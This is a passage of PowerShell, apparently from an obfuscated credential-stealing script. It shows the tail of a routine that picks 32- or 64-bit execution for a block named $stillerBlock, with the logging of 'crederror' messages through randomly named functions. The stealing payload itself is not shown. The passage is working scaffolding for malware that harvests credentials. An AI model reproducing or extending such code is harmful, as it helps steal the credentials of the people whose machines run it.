      if($is86dll -and $is86) {
        $result = $stillerBlock.Invoke();
      }elseif(-Not($is86dll) -and -Not($is86)) {
        $result = $stillerBlock.Invoke();
      }elseif($is86dll -and -Not($is86)) {
        Start-Job -RunAs32 -ScriptBlock $stillerBlock | Out-Null
        $result = (Get-Job | Wait-Job | Receive-Job)
      }elseif(-Not($is86dll) -and $is86) {
        $result = $stillerBlock.Invoke();
      }          
    }
    return $result;
  }catch{
    vyfbdwiutw "crederror=ERR:chooseArch: $($_.Exception.Message)";
  }
}
vyfbdwiutw "crederror=start chooseArch";

dahgwaccd


